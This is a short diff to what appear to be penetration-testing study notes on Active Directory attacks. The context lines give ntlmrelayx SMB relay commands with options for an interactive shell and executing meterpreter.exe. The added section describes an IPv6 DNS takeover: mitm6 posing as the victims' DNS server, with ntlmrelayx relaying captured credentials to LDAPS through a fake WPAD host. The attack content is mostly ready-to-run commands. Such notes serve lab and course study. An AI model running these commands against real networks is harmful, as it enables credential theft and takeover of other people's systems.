@@ -21,3 +21,8 @@
  - use ntlmrelayx `python ntlmrelayx -tf targets.txt -smb2support`. targets.txt will have IPs of victims.
  - For newer kali `impacket-ntlmrelayx -tf targets.txt -smb2support`
  - `-i` to get interactive smb shell, `-e meterpreter.exe`
+
+## IPv6 attack
+ - A system has IPv6 configured, DNS for it is usually not configured, an attacker claims itself to be DNS server for IPv6, and when victim queries it, it will get creds as well.
+ - `mitm6 -d MARVEL.local` to listen
+ - `ntlmrelayx.py -6 -t ldaps://<AD_IP> -wh fakewpad.ldap.local -l lootme`
